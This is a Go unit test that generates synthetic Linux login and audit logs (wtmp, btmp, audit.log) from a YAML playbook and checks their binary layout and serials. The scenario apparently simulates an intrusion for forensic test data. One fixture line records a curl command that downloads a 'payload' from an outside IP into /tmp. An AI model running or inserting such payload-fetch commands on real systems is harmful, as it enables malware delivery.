package manifest

import (
	"bytes"
	"encoding/binary"
	"regexp"
	"strings"
	"testing"
)

// TestLinuxLogsThroughPlaybook: in a playbook, login records and audit
// events that name no user are the actor's; a wtmp holds a 384-byte record
// per entry, a logout taking its login's pid; the audit log's records carry
// the program's arguments and one serial per event. libgen's tests and
// util-linux read the files in full.
func TestLinuxLogsThroughPlaybook(t *testing.T) {
	root, _ := runRes(t, `
start: 2024-03-15T09:00:00Z
actors:
  - name: alice
    base: var/log
steps:
  - actor: alice
    offset: 10m
    actions:
      - action: create
        path: wtmp
        utmp:
          records:
            - { type: boot, time: 2024-03-15T08:00:00Z }
            - { type: login, host: 203.0.113.7 }
            - { type: logout, time: 2024-03-15T10:00:00Z }
      - action: create
        path: btmp
        utmp:
          records:
            - { type: failed, user: root, host: 203.0.113.7, time: 2024-03-15T09:09:00Z }
      - action: create
        path: audit/audit.log
        auditd:
          events:
            - { type: auth, host: 203.0.113.7 }
            - { type: login, host: 203.0.113.7 }
            - { type: execve, argv: [curl, -o, /tmp/x, 'http://198.51.100.42/payload'], key: exec }
`)
	wtmp := readOut(t, root, "var/log/wtmp")
	if len(wtmp) != 3*384 {
		t.Fatalf("wtmp is %d bytes, want three records", len(wtmp))
	}
	le := binary.LittleEndian
	login, logout := wtmp[384:768], wtmp[768:]
	if le.Uint16(login) != 7 || !bytes.HasPrefix(login[44:], []byte("alice\x00")) || !bytes.HasPrefix(login[8:], []byte("pts/0\x00")) {
		t.Errorf("login record: type %d user %q line %q; want the actor on pts/0", le.Uint16(login), bytes.TrimRight(login[44:76], "\x00"), bytes.TrimRight(login[8:40], "\x00"))
	}
	if le.Uint16(logout) != 8 || le.Uint32(logout[4:]) != le.Uint32(login[4:]) || le.Uint32(login[4:]) == 0 {
		t.Errorf("logout: type %d pid %d; login pid %d", le.Uint16(logout), le.Uint32(logout[4:]), le.Uint32(login[4:]))
	}
	if btmp := readOut(t, root, "var/log/btmp"); len(btmp) != 384 || le.Uint16(btmp) != 6 || !bytes.HasPrefix(btmp[44:], []byte("root\x00")) {
		t.Errorf("btmp: %d bytes, type %d", len(btmp), le.Uint16(btmp))
	}

	audit := string(readOut(t, root, "var/log/audit/audit.log"))
	if !strings.Contains(audit, `acct="alice" exe="/usr/sbin/sshd" hostname=203.0.113.7 addr=203.0.113.7 terminal=ssh res=success`) {
		t.Errorf("no USER_AUTH for the actor:\n%s", audit)
	}
	if !strings.Contains(audit, `comm="curl" exe="/usr/bin/curl" key="exec"`) || !strings.Contains(audit, `cwd="/home/alice"`) {
		t.Errorf("no execve of curl by the actor:\n%s", audit)
	}
	serials := regexp.MustCompile(`:(\d+)\): `).FindAllStringSubmatch(audit, -1)
	if len(serials) != 2+6 {
		t.Fatalf("%d records, want 2 for the login and 6 for the execve", len(serials))
	}
	for _, s := range serials[3:] {
		if s[1] != serials[2][1] {
			t.Errorf("the execve's records have serials %v", serials[2:])
			break
		}
	}
}
